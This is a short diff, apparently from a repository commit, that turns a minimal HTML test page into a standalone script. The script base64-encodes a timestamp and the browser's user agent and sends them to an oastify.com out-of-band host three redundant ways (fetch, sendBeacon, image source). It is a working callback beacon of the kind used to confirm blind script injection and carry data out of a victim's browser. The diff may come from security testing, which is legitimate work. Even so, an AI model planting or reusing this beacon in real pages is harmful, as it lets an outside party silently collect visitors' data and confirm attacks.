@@ -1,45 +1,13 @@
-<!DOCTYPE html>
+<script>
+(async () => {
+    const test = { test: true, time: Date.now(), ua: navigator.userAgent };
+    const b64 = btoa(JSON.stringify(test));
+    const url = `https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?data=${encodeURIComponent(b64)}&test=1`;
 
-
-
-<html>
-
-
-<head>
-
-
-    <title>JS Test</title>
-
-
-</head>
-
-
-<body>
-
-
-    Testing...
-
-
-
-
-
-    <script>
-
-
-    fetch("https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?fetched_by_js")
-
-
-      .catch(() => {});
-
-
-    </script>
-
-
-
-
-
-</body>
-
-
-</html>
-0 commit commentsComments
+    console.log("Sending test request...");
+    try { fetch(url, {mode: 'no-cors'}); } catch(e) {}
+    try { navigator.sendBeacon && navigator.sendBeacon(url); } catch(e) {}
+    try { new Image().src = url; } catch(e) {}
+    console.log("Test requests fired");
+})();
+</script>
